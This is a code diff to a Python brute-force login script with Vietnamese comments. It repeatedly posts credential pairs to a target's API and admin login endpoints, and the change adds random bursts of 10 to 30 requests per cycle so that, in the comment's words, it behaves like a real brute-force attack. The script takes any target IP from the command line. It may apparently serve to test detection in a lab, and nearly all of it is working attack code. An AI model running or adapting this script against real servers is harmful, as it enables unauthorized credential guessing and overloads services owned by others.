@@ -24,45 +24,52 @@ PAYLOADS = [
     {"username": "testuser", "password": "testpass"},
 ]
 
+
 def soft_attack(base_url, rps=10):
     """
-    rps = request per second (mỗi giây)
-    mỗi vòng gửi 2 request: API + ADMIN
-    Nghĩa là mỗi vòng ngủ (1 / (rps/2)) giây
+    rps = request/second
+    Nhưng thay vì cố định mỗi vòng 2 request,
+    ta sẽ gửi RANDOM 10 → 30 request mỗi vòng.
+    Điều này tạo hành vi giống brute-force thực tế.
     """
     api_url = base_url + API_LOGIN
     admin_url = base_url + ADMIN_LOGIN
 
     session = requests.Session()
-    interval = 1 / (rps / 2)   # vì mỗi cycle gửi 2 request
 
     print(f"\n=== SOFT BRUTEFORCE STARTED ===")
     print(f"Base URL: {base_url}")
-    print(f"Target rate: ~{rps} requests/second")
+    print(f"Target rate: ~{rps} requests/sec (ngẫu nhiên 10→30 per cycle)")
     print("Nhấn CTRL + C để dừng.\n")
 
-    count = 0
+    total = 0
     try:
         while True:
-            payload = random.choice(PAYLOADS)
+            # Random lượng request mỗi vòng
+            burst = random.randint(10, 30)
 
-            try:
-                session.post(api_url, data=payload, headers=HEADERS, timeout=1)
-                session.post(admin_url, data=payload, headers=HEADERS, timeout=1)
-            except:
-                pass
+            for _ in range(burst):
+                payload = random.choice(PAYLOADS)
 
-            count += 2
+                try:
+                    session.post(api_url, data=payload, headers=HEADERS, timeout=1)
+                    session.post(admin_url, data=payload, headers=HEADERS, timeout=1)
+                except:
+                    pass
 
-            # in mỗi 2 giây để tránh spam console
-            if count % 20 == 0:
-                print(f"[INFO] Sent {count} requests...")
+                total += 2
 
-            time.sleep(interval)
+            # Tính time sleep để gần giống rps mục tiêu
+            # Vì mỗi vòng gửi khoảng burst * 2 request
+            sleep_time = max(0.01, burst / rps)
+            time.sleep(sleep_time)
+
+            if total % 50 == 0:
+                print(f"[INFO] Sent {total} requests...")
 
     except KeyboardInterrupt:
-        print(f"\n=== STOPPED BY USER ===")
-        print(f"Tổng request đã gửi: {count}\n")
+        print("\n=== STOPPED BY USER ===")
+        print(f"Tổng request đã gửi: {total}\n")
 
 
 def main():
@@ -73,7 +80,6 @@ def main():
     ip = sys.argv[1]
     base_url = f"http://{ip}"
 
-    # chạy khoảng 10 request/giây
     soft_attack(base_url, rps=10)
 
 
